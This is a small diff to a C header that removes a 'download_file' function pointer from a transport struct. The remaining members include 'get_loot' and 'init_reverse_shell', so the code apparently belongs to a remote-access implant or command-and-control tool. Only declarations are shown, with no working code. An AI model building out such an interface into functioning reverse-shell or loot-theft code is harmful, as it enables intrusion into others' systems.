@@ -11,7 +11,6 @@ typedef struct _transport {
     int (*read)(char **buff, int length);
     int (*write)(char *buff, int length);
 
-    int (*download_file)(char *ptr, int is_manager, char *extra);
     int (*get_loot)(char *loot);
     int (*upload_file)(char *ptr, int is_module);
     int (*init_reverse_shell)(char *id);
